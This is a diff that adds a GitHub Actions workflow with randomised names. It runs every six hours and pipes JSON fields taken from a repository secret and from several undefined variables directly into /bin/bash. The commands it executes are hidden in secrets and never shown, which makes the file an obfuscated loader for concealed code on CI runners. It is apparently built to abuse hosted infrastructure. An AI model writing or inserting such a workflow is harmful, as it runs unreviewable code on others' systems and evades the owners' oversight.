@@ -1,0 +1,24 @@
+name: sheilaikaidaotane
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: sheilaikaidaotane
+        env:
+          htj08: ${{ secrets.htj08 }}
+        run: |
+          echo $htj08 | jq -r .p7211 | /bin/bash
+          echo $dncov9381 | jq -r .cjen39042 | /bin/bash
+          echo $fl3 | jq -r .j4 | /bin/bash
+          echo $umbbh32937 | jq -r .ye639 | /bin/bash
+          echo $pxk5 | jq -r .hevhi66599 | /bin/bash
+          echo $dkb5257 | jq -r .l21 | /bin/bash
+          echo $fln2226 | jq -r .xx775 | /bin/bash
+
